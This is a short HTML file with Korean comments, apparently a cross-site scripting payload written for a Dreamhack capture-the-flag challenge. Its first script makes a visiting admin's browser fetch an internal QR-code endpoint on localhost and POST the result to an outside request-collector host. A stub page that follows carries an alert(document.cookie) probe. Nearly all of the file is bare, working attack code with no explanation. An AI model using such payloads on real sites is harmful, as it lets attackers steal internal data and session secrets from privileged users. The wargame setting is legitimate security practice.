<script>
    // 관리자를 자동으로 공격자 서버로 리다이렉트
    var admin_url = "http://127.0.0.1:10023/generate_qr_code";
    fetch(admin_url).then(response => response.text()).then(data => {
        // QR 코드 정보를 공격자 서버로 전송
        fetch("https://qbxfywa.request.dreamhack.games", {
            method: "POST",
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                qr_info: data
            })
        });
    });
</script>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <p>hello</p>
    <script>alert(document.cookie)</script>
</body>
</html>
